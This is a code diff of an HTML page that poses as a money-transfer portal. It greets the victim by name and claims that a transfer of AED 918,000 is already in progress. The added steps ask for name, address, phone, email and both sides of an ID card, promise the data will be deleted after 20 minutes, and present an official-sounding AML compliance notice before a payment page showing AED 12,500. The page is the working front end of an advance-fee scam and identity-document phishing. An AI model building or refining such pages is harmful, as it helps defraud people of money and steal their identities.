@@ -72,63 +72,125 @@
 
         <!-- PAGE 2: ID DOCUMENT PREVIEW -->
 
-        <section id="uploadPage" class="payment-card d-none">
+        
+<section id="uploadPage" class="d-none">
 
-            <div class="icon-circle">🪪</div>
+    <div class="payment-card">
 
-            <h3>Welcome, Irina!</h3>
+        <h5 class="mb-2 fw-bolder">Complete the AML Compliance form below.</h5>
 
-            <p class="text-muted">
-                This is AML transfer procedure.
+        <p class="text-muted fs-6 fw-bolder">
+            Identity Verification
+        </p>
+
+        <form id="verificationForm" onsubmit="startVerification(event)">
+
+            <!-- Full Name -->
+            <div class="mb-3">
+                <label for="fullName" class="form-label">Full Name</label>
+                <input
+                    type="text"
+                    id="fullName"
+                    class="form-control"
+                    placeholder="Enter your full name"
+                    required
+                >
+            </div>
+
+            <!-- Address -->
+            <div class="mb-3">
+                <label for="address" class="form-label">Address</label>
+                <textarea
+                    id="address"
+                    class="form-control"
+                    placeholder="Enter your address"
+                    rows="3"
+                    required
+                ></textarea>
+            </div>
+
+            <!-- Phone Number -->
+            <div class="mb-3">
+                <label for="phone" class="form-label">Phone Number</label>
+                <input
+                    type="tel"
+                    id="phone"
+                    class="form-control"
+                    placeholder="Enter your phone number"
+                    required
+                >
+            </div>
+
+            <!-- Email -->
+            <div class="mb-3">
+                <label for="email" class="form-label">Email Address</label>
+                <input
+                    type="email"
+                    id="email"
+                    class="form-control"
+                    placeholder="Enter your email"
+                    required
+                >
+            </div>
+
+            <hr>
+
+            <h5>ID Card Images</h5>
+
+            <p class="text-muted small">
+                Verify you identity.
             </p>
 
-            <h5 class="mt-4">Identity Document Preview</h5>
+            <!-- Front ID -->
+            <div class="mb-3">
+                <label for="frontID" class="form-label">
+                    ID Card Front
+                </label>
 
-            <p class="small text-muted">
-                Identities are previewed internally and not transmitted.
-            </p>
+                <input
+                    type="file"
+                    id="frontID"
+                    class="form-control"
+                    accept="image/*"
+                    required
+                >
+            </div>
 
-            <label class="form-label">Front of ID</label>
+            <!-- Back ID -->
+            <div class="mb-3">
+                <label for="backID" class="form-label">
+                    ID Card Back
+                </label>
 
-            <input
-                type="file"
-                id="frontID"
-                class="form-control"
-                accept="image/*"
-                onchange="previewImage(event, 'frontPreview')"
-            >
+                <input
+                    type="file"
+                    id="backID"
+                    class="form-control"
+                    accept="image/*"
+                    required
+                >
+            </div>
 
-            <img id="frontPreview" class="id-preview d-none">
-
-
-            <label class="form-label mt-4">Back of ID</label>
-
-            <input
-                type="file"
-                id="backID"
-                class="form-control"
-                accept="image/*"
-                onchange="previewImage(event, 'backPreview')"
-            >
-
-            <img id="backPreview" class="id-preview d-none">
-
-
-            <div class="security-note mt-4">
+            <div class="security-note my-4">
 
                 <strong>Privacy information</strong>
 
                 <p class="small mb-0">
-                    Your Identity is save with us and will be deleted from database 20 minutes after verification.
+                    Your identity is safe with us and will be deleted from database 20 minutes after verification
                 </p>
 
             </div>
 
-            <button class="btn btn-primary w-100 mt-4" onclick="startVerification()">
+            <button type="submit" class="btn btn-primary w-100">
                 Continue
             </button>
 
-        </section>
+        </form>
+
+    </div>
+
+</section>
+
 
 
         <!-- PAGE 3: LOADING
@@ -185,23 +247,18 @@
             <h3>Transfer Summary</h3>
 
             <p class="text-muted">
-                Review the transaction details.
+                The transaction is already in progress
+                Kinly review the transaction details are correct before proceeding.
             </p>
 
             <label class="form-label">Amount</label>
 
             <div class="input-group mb-4">
+                <span class="input-group-text fw-bolder">AED</span>
 
-                <span class="input-group-text">AED</span>
-
-                <input
-                    type="number"
-                    id="transferAmount"
-                    class="form-control"
-                    min="1"
-                    placeholder="Enter amount"
-                >
-
+                <p id="transferAmount" class="form-control mb-0 input-group-text fw-bolder">
+                    918,000
+                </p>
             </div>
 
 
@@ -253,7 +310,7 @@
 
             <div class="icon-circle">📋</div>
 
-            <h3>Confirm Transfer Details</h3>
+            <h3>Confirm Details</h3>
 
             <p class="text-muted">
                 Kindly confirm that the following details are correct.
@@ -283,7 +340,7 @@
 
             </div>
 
-            <div class="security-note mt-4">
+            <!-- <div class="security-note mt-4">
 
                 <strong>Payment information</strong>
 
@@ -291,29 +348,46 @@
                     Select a payment method to view its instructions.
                 </p>
 
-            </div>
+            </div> -->
 
-            <button class="btn btn-primary w-100 mt-4" onclick="showPage('paymentPage')">
-                View Payment Methods
+            <button class="btn btn-primary w-100 mt-4" onclick="showPage('instructionPage')">
+                Click to Continue
             </button>
 
             <button class="btn btn-light w-100 mt-2" onclick="showPage('transferPage')">
-                Edit Transfer Details
+                Edit Details
             </button>
 
         </section>
 
-        <!-- <section id="loadingPage" class="payment-card text-center d-none">
+        
+<!-- INSTRUCTION PAGE -->
+        <section id="instructionPage" class="d-none">
 
-            <div class="spinner-border text-primary spinner-large"></div>
+            <div class="payment-card">
 
-            <h4 class="mt-4">Processing...</h4>
+                <h5>NOTICE OF AML COMPLIANCE REQUIREMENTS</h5>
 
-            <p class="text-muted">
-                Please wait.
-            </p>
+                <b class="mb-3">Kindly be informed that Anti-Money Laundering (AML) compliance procedures involve applicable regulatory and administrative fees</b>
 
-        </section> -->
+                <p>
+                    AML compliance is an essential financial regulatory process designed to verify the legitimacy and source of funds, ensure compliance with applicable local and international financial regulations, protect financial institutions and beneficiaries against fraudulent transactions, facilitate the secure and lawful processing and transfer of funds across international borders.
+                    Upon completion of the applicable compliance requirements and confirmation of payment, an official receipt will be issued here accordingly.
+                </p>
+
+                <p>
+                    Please note that AML compliance is intended to ensure that the transaction meets relevant regulatory requirements and that the funds can be processed and delivered through the appropriate financial channels without avoidable compliance delays or restrictions.
+                </p>
+
+                <button class="btn btn-primary w-100"
+                        onclick="showPage('paymentPage')">
+                    Continue to Payment
+                </button>
+
+            </div>
+
+        </section>
+
 
         <!-- PAGE 7: PAYMENT GATEWAY -->
 
@@ -330,9 +404,9 @@
 
             <div class="account-details mb-4">
 
-                <p class="text-muted small">FEE</p>
+                <p class="text-muted small">Amount</p>
 
-                <h3 id="displayFee">AED 0:00</h3>
+                <h5 id="displayFee">AED 12,500:00</h5>
 
             </div>
 
